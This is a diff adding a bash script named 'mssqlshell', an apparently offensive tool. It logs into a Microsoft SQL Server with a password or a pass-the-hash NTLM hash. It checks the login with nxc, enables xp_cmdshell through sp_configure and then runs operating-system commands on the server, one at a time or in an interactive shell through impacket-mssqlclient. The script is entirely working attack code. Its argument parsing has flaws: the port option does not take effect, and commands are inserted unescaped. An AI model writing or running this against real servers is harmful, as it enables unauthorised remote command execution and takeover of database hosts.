@@ -1,0 +1,108 @@
+#!/bin/bash
+
+RED='\033[31m'
+GREEN='\033[32m'
+BLUE='\033[34m'
+YELLOW='\033[33m'
+CYAN='\033[36m'
+NC='\033[0m'
+
+usage() {
+    echo -e "${RED}Usage: mssqlshell <target> <user> <pass|hash> [cmd] [options]${NC}"
+    echo ""
+    echo -e "${BLUE}  mssqlshell 10.10.10.5 sa Password123${NC}              # interactive shell"
+    echo -e "${BLUE}  mssqlshell 10.10.10.5 sa Password123 whoami${NC}       # exec single cmd"
+    echo -e "${BLUE}  mssqlshell 10.10.10.5 admin aad3b435:8846f7ea${NC}     # PTH"
+    echo -e "${BLUE}  mssqlshell 10.10.10.5 sa pass whoami --windows-auth${NC}"
+    echo ""
+    echo -e "${BLUE}  Options: --windows-auth  --local-auth  --port <port>${NC}"
+    exit 1
+}
+
+[ "$#" -lt 3 ] && usage
+
+TARGET="$1"
+USER="$2"
+CRED="$3"
+CMD="${4:-}"
+PORT="1433"
+WIN_AUTH=""
+LOCAL_AUTH=""
+
+# Parse optional args (skip positional cmd if it starts with --)
+CMD=""
+for arg in "${@:4}"; do
+    case "$arg" in
+        --windows-auth) WIN_AUTH="-windows-auth" ;;
+        --local-auth)   LOCAL_AUTH="--local-auth" ;;
+        --port)         shift ;;
+        [0-9]*)         [ "${prev:-}" = "--port" ] && PORT="$arg" ;;
+        --*)            ;;
+        *)              [ -z "$CMD" ] && CMD="$arg" ;;
+    esac
+    prev="$arg"
+done
+
+# Detect hash vs password
+IS_HASH=false
+if echo "$CRED" | grep -qP '^[a-f0-9]{32}:[a-f0-9]{32}$|^[a-f0-9]{32}$'; then
+    IS_HASH=true
+fi
+
+echo ""
+echo -e "${YELLOW}== MSSQL Shell: $TARGET ==${NC}"
+echo -e "${CYAN}User: $USER | Port: $PORT${NC}"
+
+# Build connection string
+if [ "$IS_HASH" = true ]; then
+    CONN="${USER}@${TARGET} -hashes ${CRED} -port ${PORT} ${WIN_AUTH}"
+    NXC_CRED="-u $USER -H $CRED $LOCAL_AUTH"
+else
+    CONN="${USER}:${CRED}@${TARGET} -port ${PORT} ${WIN_AUTH}"
+    NXC_CRED="-u $USER -p $CRED $LOCAL_AUTH"
+fi
+
+# Validate connection first via nxc
+echo -e "\n${CYAN}[*] Validating connection...${NC}"
+NXC_OUT=$(nxc mssql "$TARGET" $NXC_CRED 2>/dev/null | tail -1)
+echo "$NXC_OUT"
+
+if echo "$NXC_OUT" | grep -q "\[+\]"; then
+    echo -e "${GREEN}[+] Auth OK${NC}"
+else
+    echo -e "${RED}[-] Auth failed or MSSQL not reachable${NC}"
+    echo -e "${YELLOW}Try: --windows-auth or --local-auth${NC}"
+    exit 1
+fi
+
+# Enable xp_cmdshell
+echo -e "\n${CYAN}[*] Enabling xp_cmdshell...${NC}"
+ENABLE_CMDS="EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;"
+
+if [ -n "$CMD" ]; then
+    # Single command mode
+    echo -e "${CYAN}[*] Executing: $CMD${NC}"
+    python3 -c "
+import subprocess, sys
+cmds = '''${ENABLE_CMDS}
+EXEC xp_cmdshell '${CMD}';
+'''
+proc = subprocess.run(
+    ['impacket-mssqlclient', '${CONN}'],
+    input=cmds, capture_output=True, text=True, timeout=30
+)
+print(proc.stdout)
+if proc.stderr: print(proc.stderr, file=sys.stderr)
+" 2>/dev/null | grep -v "^$" | grep -v "^\[" | grep -v "Impacket"
+else
+    # Interactive mode — inject enable commands then drop to shell
+    echo -e "${GREEN}[+] Dropping to interactive shell (xp_cmdshell enabled)${NC}"
+    echo -e "${BLUE}Tip: EXEC xp_cmdshell 'whoami';${NC}"
+    echo -e "${BLUE}Tip: enable_xp_cmdshell  (shortcut in mssqlclient)${NC}"
+    echo ""
+    echo "$ENABLE_CMDS" | impacket-mssqlclient $CONN 2>/dev/null || \
+        impacket-mssqlclient $CONN
+fi
+
+echo ""
+echo -e "${YELLOW}=================================${NC}"
